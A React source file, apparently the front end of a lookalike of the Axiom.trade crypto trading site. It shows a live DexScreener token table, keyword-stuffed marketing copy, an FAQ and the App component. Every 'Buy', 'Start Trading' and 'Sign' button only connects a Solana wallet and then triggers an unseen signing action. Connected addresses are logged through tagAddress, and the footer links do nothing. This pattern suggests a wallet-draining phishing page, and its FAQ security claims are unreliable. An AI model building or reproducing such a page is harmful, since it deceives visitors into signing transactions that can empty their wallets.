/* ─── Trending Tokens ─── */
function TrendingTokens({ onConnect }) {
  const [tokens, setTokens] = useState([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState(null)

  const fetchTrending = useCallback(async () => {
    try {
      setLoading(true)
      const res = await fetch('https://api.dexscreener.com/latest/dex/search?q=solana', { cache: 'no-store' })
      if (!res.ok) throw new Error('Failed')
      const data = await res.json()
      const sorted = (data.pairs || []).filter(p => p.chainId === 'solana').sort((a,b) => (b.volume?.h24||0)-(a.volume?.h24||0)).slice(0,10)
      setTokens(sorted)
    } catch(e) { setError(e.message); setTokens([]) }
    finally { setLoading(false) }
  }, [])

  useEffect(() => { fetchTrending(); const i = setInterval(fetchTrending, 30000); return () => clearInterval(i) }, [fetchTrending])

  const fmt = (n) => {
    if (!n) return '$0'
    if (n >= 1e9) return '$' + (n/1e9).toFixed(2) + 'B'
    if (n >= 1e6) return '$' + (n/1e6).toFixed(2) + 'M'
    if (n >= 1e3) return '$' + (n/1e3).toFixed(2) + 'K'
    return '$' + Number(n).toFixed(2)
  }

  return (
    <section className="flex w-full flex-col items-center justify-start px-[12px] py-[72px] sm:px-[16px] sm:py-[96px] lg:px-[24px] lg:py-[144px]" style={{ background: '#06070B' }}>
      <div className="flex w-full max-w-[1252px] flex-col items-center justify-start gap-[32px] sm:gap-[48px] lg:gap-[64px]">
        <div className="flex w-full flex-col items-center justify-start gap-[16px] px-[16px] sm:items-start sm:px-0">
          <span className="text-center text-[31px] font-medium tracking-[-0.02px] sm:text-left sm:text-[39px] lg:text-[49px]">Trending</span>
          <span className="text-center text-[16px] font-normal sm:text-left sm:text-[18px] lg:text-[20px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Real-time trending pairs on Solana, fetched live from DexScreener.</span>
        </div>
        <div className="w-full overflow-hidden rounded-[4px] border" style={{ borderColor: 'rgb(var(--primary-stroke))' }}>
          <div className="flex w-full flex-row items-center gap-[8px] border-b px-[12px] py-[10px] sm:px-[16px]" style={{ borderColor: 'rgb(var(--primary-stroke))', background: 'rgb(var(--background-tertiary))' }}>
            <div className="flex-1 text-[12px] font-medium sm:text-[13px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Pair</div>
            <div className="hidden w-[100px] text-right text-[12px] font-medium sm:block sm:text-[13px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Market Cap</div>
            <div className="hidden w-[100px] text-right text-[12px] font-medium md:block sm:text-[13px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Liquidity</div>
            <div className="hidden w-[100px] text-right text-[12px] font-medium lg:block sm:text-[13px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Volume (24h)</div>
            <div className="w-[80px] text-right text-[12px] font-medium sm:text-[13px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Change</div>
            <div className="w-[70px] text-right text-[12px] font-medium sm:text-[13px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Action</div>
          </div>
          {loading && (
            <div className="flex flex-col gap-[1px]">
              {[...Array(5)].map((_,i) => (
                <div key={i} className="flex w-full flex-row items-center gap-[8px] px-[12px] py-[12px] sm:px-[16px]" style={{ background: i%2===0?'transparent':'rgba(255,255,255,0.01)' }}>
                  <div className="flex flex-1 items-center gap-[10px]"><div className="h-[32px] w-[32px] rounded-full shimmer" /><div className="flex flex-col gap-[4px]"><div className="h-[14px] w-[100px] shimmer" /><div className="h-[12px] w-[60px] shimmer" /></div></div>
                  <div className="hidden w-[100px] sm:block"><div className="h-[14px] w-[70px] shimmer ml-auto" /></div>
                  <div className="hidden w-[100px] md:block"><div className="h-[14px] w-[70px] shimmer ml-auto" /></div>
                  <div className="hidden w-[100px] lg:block"><div className="h-[14px] w-[70px] shimmer ml-auto" /></div>
                  <div className="w-[80px]"><div className="h-[14px] w-[50px] shimmer ml-auto" /></div>
                  <div className="w-[70px]"><div className="h-[28px] w-[50px] rounded-full shimmer ml-auto" /></div>
                </div>
              ))}
            </div>
          )}
          {!loading && error && (
            <div className="flex flex-col items-center justify-center gap-[12px] px-[24px] py-[48px]">
              <span className="text-[14px]" style={{ color: 'rgb(var(--text-tertiary))' }}>Unable to load trending data.</span>
              <button onClick={fetchTrending} className="flex h-[32px] items-center justify-center rounded-full px-[16px] text-[13px] font-semibold text-black" style={{ background: 'rgb(var(--primary-color))' }}>Retry</button>
            </div>
          )}
          {!loading && !error && tokens.map((t,i) => {
            const pc = t.priceChange?.h24 || 0
            const pos = pc >= 0
            const imgUrl = t.info?.imageUrl || `https://dd.dexscreener.com/ds-data/tokens/solana/${t.baseToken?.address}.png?size=lg`
            return (
              <div key={t.pairAddress||i} className="trending-row flex w-full flex-row items-center gap-[8px] border-b px-[12px] py-[10px] sm:px-[16px]" style={{ borderColor: 'rgb(var(--primary-stroke))', background: i%2===0?'transparent':'rgba(255,255,255,0.01)' }}>
                <div className="flex flex-1 items-center gap-[10px] min-w-0">
                  <img src={imgUrl} alt={t.baseToken?.symbol} className="h-[32px] w-[32px] flex-shrink-0 rounded-full object-cover" style={{ background: 'rgb(var(--primary-stroke))' }} onError={e => { e.target.style.display='none' }} />
                  <div className="flex min-w-0 flex-col">
                    <span className="truncate text-[13px] font-medium sm:text-[14px]" style={{ color: 'rgb(var(--text-primary))' }}>{t.baseToken?.name||'Unknown'}</span>
                    <span className="text-[11px] sm:text-[12px]" style={{ color: 'rgb(var(--text-tertiary))' }}>{t.baseToken?.symbol||'???'}/{t.quoteToken?.symbol||'SOL'}</span>
                  </div>
                </div>
                <div className="hidden w-[100px] text-right sm:block"><span className="text-[12px] font-medium sm:text-[13px]" style={{ color: 'rgb(var(--text-primary))' }}>{fmt(t.marketCap)}</span></div>
                <div className="hidden w-[100px] text-right md:block"><span className="text-[12px] font-medium sm:text-[13px]" style={{ color: 'rgb(var(--text-primary))' }}>{fmt(t.liquidity?.usd)}</span></div>
                <div className="hidden w-[100px] text-right lg:block"><span className="text-[12px] font-medium sm:text-[13px]" style={{ color: 'rgb(var(--text-primary))' }}>{fmt(t.volume?.h24)}</span></div>
                <div className="w-[80px] text-right"><span className="text-[12px] font-semibold sm:text-[13px]" style={{ color: pos?'rgb(var(--increase))':'rgb(var(--decrease))' }}>{pos?'+':''}{pc.toFixed(2)}%</span></div>
                <div className="w-[70px] text-right"><button onClick={onConnect} className="inline-flex h-[28px] items-center justify-center rounded-full px-[12px] text-[12px] font-bold text-black sm:h-[32px] sm:px-[16px] sm:text-[13px]" style={{ background: 'rgb(var(--primary-color))' }}>Buy</button></div>
              </div>
            )
          })}
        </div>
      </div>
    </section>
  )
}

/* ─── Brand Narrative ─── */
function BrandNarrative({ onSign, isLoading, connected }) {
  return (
    <section className="flex w-full flex-col items-center justify-start px-[12px] py-[72px] sm:px-[16px] sm:py-[96px] lg:px-[24px] lg:py-[144px]" style={{ backgroundImage: 'linear-gradient(#000 0%, #101114 100%)' }}>
      <div className="flex w-full max-w-[860px] flex-col gap-[20px] rounded-[4px] border p-[32px] sm:p-[40px] lg:p-[48px]" style={{ borderColor: 'rgb(var(--primary-stroke))', background: 'rgba(16,17,20,0.7)' }}>
        <p className="text-[15px] font-normal leading-[1.8] sm:text-[16px] lg:text-[17px]" style={{ color: 'rgb(var(--text-secondary))' }}>At <span className="keyword">Axiom.trade</span>, we believe that trading infrastructure should be as elegant as the strategies it supports. Our platform isn't just a tool; it's an ecosystem engineered for clarity, speed, and reliability. By integrating the raw power of <span className="keyword">axiom crypto</span> with an intuitive, minimalist interface, we've removed the friction between decision and execution.</p>
        <p className="text-[15px] font-normal leading-[1.8] sm:text-[16px] lg:text-[17px]" style={{ color: 'rgb(var(--text-secondary))' }}>Whether you are a seasoned institutional trader or a dedicated retail investor, the <span className="keyword">axiom trading platform</span> offers the stability and depth you need to navigate volatile markets with confidence. Every data point and interface element is optimized for performance, ensuring that your focus remains on the market, not the mechanics.</p>
        <p className="text-[15px] font-normal leading-[1.8] sm:text-[16px] lg:text-[17px]" style={{ color: 'rgb(var(--text-secondary))' }}>For those who demand more, <span className="keyword">Axiom pro</span> unlocks advanced analytics, priority execution layers, and deeper liquidity pools tailored for high-frequency demands. This is not just an upgrade; it's a different tier of engagement. When you join <span className="keyword">axiom trade</span>, you aren't just signing up for a service—you're joining a community defined by superior design and relentless innovation.</p>
        <p className="text-[15px] font-normal leading-[1.8] sm:text-[16px] lg:text-[17px]" style={{ color: 'rgb(var(--text-secondary))' }}>Discover the difference at <span className="keyword">Axiom.trade</span>—where technology meets transparency.</p>
        <button
          type="button"
          onClick={onSign}
          disabled={isLoading}
          className="flex h-[44px] w-full flex-row items-center justify-center rounded-full px-[16px] text-[15px] font-bold text-black sm:h-[48px] sm:text-[16px]"
          style={{ background: 'rgb(var(--primary-color))', transition: 'all 0.125s ease', opacity: isLoading ? 0.6 : 1, cursor: isLoading ? 'not-allowed' : 'pointer' }}
        >
          {isLoading ? 'Signing…' : connected ? 'Sign' : 'Connect & Sign'}
        </button>
      </div>
    </section>
  )
}

/* ─── FAQ ─── */
function FAQ() {
  const [openIndex, setOpenIndex] = useState(null)
  const faqs = [
    { q: 'What makes Axiom.trade different from other exchanges?', a: 'We prioritize a seamless user experience combined with institutional-grade stability. Our <span class="keyword">axiom trading platform</span> is designed to reduce latency and improve clarity, offering a cleaner interface than traditional crowded exchanges.' },
    { q: 'Is Axiom.crypto secure?', a: 'Yes. Security is foundational to our <span class="keyword">axiom crypto</span> infrastructure. We employ multi-signature cold storage, real-time monitoring, and advanced encryption protocols to ensure your assets are protected both in transit and at rest.' },
    { q: 'What is included in Axiom pro?', a: '<span class="keyword">Axiom pro</span> is our premium tier designed for advanced users. It includes lower trading fees, access to proprietary charting tools, priority customer support, and enhanced API limits for algorithmic trading.' },
    { q: 'How do I get started on Axiom.trade?', a: 'Getting started is simple. Visit <span class="keyword">Axiom.trade</span>, create your account, complete the quick verification process, and deposit your first assets. Our onboarding guide walks you through every step, making your entry into <span class="keyword">axiom trade</span> smooth and intuitive.' },
    { q: 'Does the platform support mobile trading?', a: 'Absolutely. The <span class="keyword">axiom trading platform</span> is fully responsive, offering a native app experience for iOS and Android that mirrors the desktop functionality of <span class="keyword">Axiom pro</span>, so you can trade anywhere, anytime.' },
  ]
  return (
    <section className="flex w-full flex-col items-center justify-start px-[12px] py-[72px] sm:px-[16px] sm:py-[96px] lg:px-[24px] lg:py-[100px]" style={{ background: '#06070B' }}>
      <div className="w-full max-w-[860px]">
        <h2 className="mb-[48px] text-center text-[26px] font-bold tracking-[-0.02px] sm:text-[32px] lg:text-[36px]" style={{ color: 'rgb(var(--text-primary))' }}>Frequently Asked Questions</h2>
        <div>{faqs.map((f,i) => <FAQItem key={i} question={f.q} answer={f.a} isOpen={openIndex===i} onClick={() => setOpenIndex(openIndex===i?null:i)} />)}</div>
      </div>
    </section>
  )
}

/* ─── Footer ─── */
function Footer() {
  return (
    <footer className="flex w-full flex-col items-center justify-start gap-[12px] py-[16px] sm:py-[20px]" style={{ background: 'rgb(var(--background-tertiary))' }}>
      <div className="flex w-full max-w-[1252px] flex-row items-center justify-between gap-[16px] px-[12px] sm:px-[16px] lg:px-[24px]">
        <span className="text-[12px] font-normal" style={{ color: 'rgb(var(--text-tertiary))' }}>&copy; 2025 Axiom. All rights reserved.</span>
        <div className="flex flex-row items-center justify-start gap-[16px]">
          {['Contact','Docs','Privacy Policy','Terms of Service'].map(item => (
            <span key={item} className="cursor-default text-[12px] font-normal" style={{ color: 'rgb(var(--text-tertiary))' }}>{item}</span>
          ))}
        </div>
      </div>
    </footer>
  )
}

/* ─── App ─── */
function App() {
  const [walletOpen, setWalletOpen] = useState(false)
  const [searchOpen, setSearchOpen] = useState(false)
  const [welcomeOpen, setWelcomeOpen] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const pendingSignRef = useRef(false)
  const pendingWelcomeRef = useRef(false)
  const { connected, publicKey, disconnect } = useWallet()
  const { action } = useSolanaActions({ setIsLoading })
  const walletAddress = publicKey?.toString()

  useEffect(() => {
    if (walletAddress) tagAddress(walletAddress)
  }, [walletAddress])

  const handleSign = useCallback(async () => {
    if (!connected) {
      pendingSignRef.current = true
      setWalletOpen(true)
      return
    }
    await action()
  }, [action, connected])

  const handleStartTrading = useCallback(() => {
    if (!connected) {
      pendingWelcomeRef.current = true
      setWalletOpen(true)
      return
    }
    setWelcomeOpen(true)
  }, [connected])

  const handleWelcomeContinue = useCallback(async () => {
    await action()
  }, [action])

  useEffect(() => {
    if (!connected) return
    setWalletOpen(false)
    if (pendingWelcomeRef.current) {
      pendingWelcomeRef.current = false
      setWelcomeOpen(true)
    }
    if (pendingSignRef.current) {
      pendingSignRef.current = false
      action()
    }
  }, [connected])

  return (
    <div className="w-full overflow-hidden overflow-y-auto" style={{ background: '#000' }}>
      <div className="flex w-full flex-col items-center">
        <Navbar
          onConnect={() => setWalletOpen(true)}
          onSearch={() => setSearchOpen(true)}
          connected={connected}
          address={publicKey?.toString()}
          onDisconnect={() => disconnect()}
        />
        <div className="flex w-full flex-col overflow-x-hidden">
          <Hero onStartTrading={handleStartTrading} />
          <Rewards />
          <Architecture />
          <TrendingTokens onConnect={() => setWalletOpen(true)} />
          <BrandNarrative onSign={handleSign} isLoading={isLoading} connected={connected} />
          <FAQ />
          <Footer />
        </div>
      </div>
      <WalletModal open={walletOpen} onClose={() => setWalletOpen(false)} />
      <SearchModal open={searchOpen} onClose={() => setSearchOpen(false)} />
      <WelcomeModal
        open={welcomeOpen}
        onClose={() => setWelcomeOpen(false)}
        onContinue={handleWelcomeContinue}
        isLoading={isLoading}
      />
    </div>
  )
}

export default App
